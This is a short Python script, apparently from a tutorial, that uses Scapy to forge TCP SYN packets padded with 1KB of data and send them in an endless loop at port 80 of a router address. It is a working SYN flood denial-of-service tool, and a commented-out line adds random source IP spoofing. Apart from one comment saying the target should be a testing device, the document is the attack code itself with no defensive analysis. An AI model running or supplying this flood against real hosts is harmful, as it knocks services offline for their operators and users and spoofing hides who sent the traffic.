from scapy.all import *

# target IP address (should be a testing router/firewall)
target_ip = "192.168.1.1"
target_port = 80

ip = IP(dst=target_ip) # forge IP packet with target ip as the destination IP address
#ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip) # or if you want to perform IP Spoofing (will work as well)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # forge a TCP SYN packet with a random source port
raw = Raw(b"X"*1024) # add some flooding data (1KB in this case)
p = ip / tcp / raw # stack up the layers
send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
